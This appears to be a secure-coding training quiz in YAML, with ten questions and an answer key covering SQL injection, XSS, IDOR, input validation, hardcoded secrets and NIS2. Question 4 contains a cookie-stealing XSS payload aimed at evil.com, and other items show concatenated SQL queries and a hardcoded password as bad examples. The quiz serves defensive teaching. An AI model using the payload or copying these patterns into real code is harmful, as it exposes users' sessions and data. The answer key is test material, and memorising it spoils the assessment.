@@ -1,0 +1,150 @@
+id: secure-coding-knowledge-check
+title: "Knowledge Check — Secure Coding"
+randomise: true
+randomise_choices: true
+pass_threshold: 0.80
+questions:
+  - id: q1
+    type: multiple-choice
+    prompt: "A developer writes: `cursor.execute(\"SELECT * FROM users WHERE id = \" + user_id)`. What vulnerability does this introduce?"
+    choices:
+      - id: a
+        text: "Cross-site scripting (XSS)"
+      - id: b
+        text: "SQL injection"
+      - id: c
+        text: "Insecure Direct Object Reference (IDOR)"
+      - id: d
+        text: "Broken authentication"
+    correct: [b]
+    explanation: "Concatenating user-supplied input directly into a SQL query allows an attacker to alter the query's structure. This is a textbook SQL injection vulnerability. The fix is a parameterised query: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))"
+    points: 1
+
+  - id: q2
+    type: multiple-choice
+    prompt: "Which of the following correctly implements a parameterised query in Python with psycopg2?"
+    choices:
+      - id: a
+        text: "cursor.execute(\"SELECT * FROM accounts WHERE email = '\" + email + \"'\")"
+      - id: b
+        text: "cursor.execute(f\"SELECT * FROM accounts WHERE email = '{email}'\")"
+      - id: c
+        text: "cursor.execute('SELECT * FROM accounts WHERE email = %s', (email,))"
+      - id: d
+        text: "cursor.execute('SELECT * FROM accounts WHERE email = ' + repr(email))"
+    correct: [c]
+    explanation: "Option C uses a placeholder (%s) and passes the value as a separate argument tuple. The driver handles escaping correctly regardless of the value's content. Options A, B, and D all use string concatenation or interpolation, which reintroduce SQL injection."
+    points: 1
+
+  - id: q3
+    type: true-false
+    prompt: "A stored procedure that builds its SQL query by concatenating input parameters internally is safe from SQL injection because it runs on the database server."
+    correct: false
+    explanation: "Stored procedures are not automatically safe. If a stored procedure constructs SQL strings internally by concatenating input values (using dynamic SQL such as EXEC or sp_executesql with concatenation), it is equally vulnerable to SQL injection. Safety comes from parameterisation, not from where the code runs."
+    points: 1
+
+  - id: q4
+    type: multiple-choice
+    prompt: "A web application reflects user-supplied search terms directly in the page HTML without encoding: `<p>Results for: [search_term]</p>`. An attacker crafts a URL with `search_term=<script>document.location='https://evil.com/?c='+document.cookie</script>`. What type of attack is this?"
+    choices:
+      - id: a
+        text: "Stored XSS"
+      - id: b
+        text: "DOM-based XSS"
+      - id: c
+        text: "Reflected XSS"
+      - id: d
+        text: "SQL injection via URL parameter"
+    correct: [c]
+    explanation: "Reflected XSS occurs when user input from a request (here, a URL parameter) is reflected immediately in the response without encoding. The payload is delivered via a crafted URL, often through a phishing email. The script executes in the victim's browser in the context of the vulnerable site."
+    points: 1
+
+  - id: q5
+    type: multiple-select
+    prompt: "Which of the following are correct defences against XSS? Select all that apply."
+    choices:
+      - id: a
+        text: "Use a template engine with autoescaping enabled (e.g., Jinja2 with autoescape=True)"
+      - id: b
+        text: "Apply context-aware output encoding — HTML encoding for HTML contexts, JavaScript encoding for JS contexts"
+      - id: c
+        text: "Strip all HTML tags from user input at the point of input"
+      - id: d
+        text: "Never insert user-controlled data into innerHTML or equivalent raw HTML insertion methods"
+    correct: [a, b, d]
+    explanation: "Autoescaping template engines (A) and context-aware encoding (B) are the primary defences. Avoiding innerHTML with user data (D) prevents DOM-based XSS. Stripping HTML tags at input (C) is an unreliable denylist approach — encoding at output is the correct control."
+    points: 1
+
+  - id: q6
+    type: scenario
+    prompt: "A user can view their account details at /api/account?id=5001. By changing the ID to 5000 in the request, they can view another user's account details. The server returns the data without error. What vulnerability is this?"
+    choices:
+      - id: a
+        text: "SQL injection"
+      - id: b
+        text: "Broken authentication"
+      - id: c
+        text: "Insecure Direct Object Reference (IDOR)"
+      - id: d
+        text: "Server-side request forgery (SSRF)"
+    correct: [c]
+    explanation: "IDOR occurs when an application exposes internal object identifiers in client-accessible parameters without verifying that the requesting user is authorised to access that specific object. The fix is a server-side authorisation check: verify that the authenticated user owns or is permitted to access the requested resource before returning it."
+    points: 1
+
+  - id: q7
+    type: multiple-choice
+    prompt: "Which input validation approach provides stronger security: allowlist (permit known-good patterns) or denylist (block known-bad patterns)?"
+    choices:
+      - id: a
+        text: "Denylist — it blocks more attack patterns"
+      - id: b
+        text: "Allowlist — it has no bypass surface for unknown attack patterns"
+      - id: c
+        text: "They are equivalent in security strength"
+      - id: d
+        text: "Neither — input validation is not a security control"
+    correct: [b]
+    explanation: "Allowlist validation defines what valid input looks like and rejects everything else. Denylists attempt to enumerate known-bad patterns — attackers routinely find bypasses that denylists do not cover. An allowlist that only permits alphanumeric characters and underscores, for example, is effective against all injection attacks that rely on special characters."
+    points: 1
+
+  - id: q8
+    type: multiple-choice
+    prompt: "A developer stores a database password as a Python constant: `DB_PASSWORD = 'S3cur3P@ss!'` at the top of their application file, which is committed to a git repository. What is the primary risk?"
+    choices:
+      - id: a
+        text: "The password may be too short"
+      - id: b
+        text: "The password is exposed in every copy of the repository including git history, CI/CD logs, and developer machines"
+      - id: c
+        text: "Python constants are slower to read than environment variables"
+      - id: d
+        text: "The risk is minimal if the repository is private"
+    correct: [b]
+    explanation: "Hardcoded secrets are exposed in all copies of the repository, in git history (even after deletion), in CI/CD pipeline logs, and on any machine that has cloned the repo. Private repositories are regularly leaked, sold, or accidentally made public. The correct approach is environment variables at minimum, a secrets vault in production."
+    points: 1
+
+  - id: q9
+    type: code-fill
+    prompt: "Complete the Python code to safely retrieve a required environment variable, failing loudly if it is not set:"
+    template: |
+      import os
+      DATABASE_URL = os.environ___'DATABASE_URL'___
+    correct: ["['DATABASE_URL']", "[\"DATABASE_URL\"]"]
+    explanation: "os.environ['KEY'] raises a KeyError if the variable is not defined, causing the application to fail fast rather than continuing with a missing or default value. os.environ.get('KEY') returns None silently, which can lead to insecure fallback behaviour."
+    points: 1
+
+  - id: q10
+    type: multiple-select
+    prompt: "Which NIS2 Article 21 sub-measures are most directly relevant to secure software development practices? Select all that apply."
+    choices:
+      - id: a
+        text: "Art.21(2)(e) — Security in network and information systems acquisition, development, and maintenance"
+      - id: b
+        text: "Art.21(2)(f) — Policies and procedures to assess the effectiveness of cybersecurity risk management measures"
+      - id: c
+        text: "Art.21(2)(g) — Basic cyber hygiene and cybersecurity training"
+      - id: d
+        text: "Art.21(2)(j) — Multi-factor authentication"
+    correct: [a, b]
+    explanation: "Art.21(2)(e) directly covers secure development and vulnerability management practices. Art.21(2)(f) covers effectiveness assessment, which includes code review, SAST/DAST scanning, and penetration testing of developed software. Cyber hygiene training (g) and MFA (j) are important controls but address operational practices rather than secure software development specifically."
+    points: 1
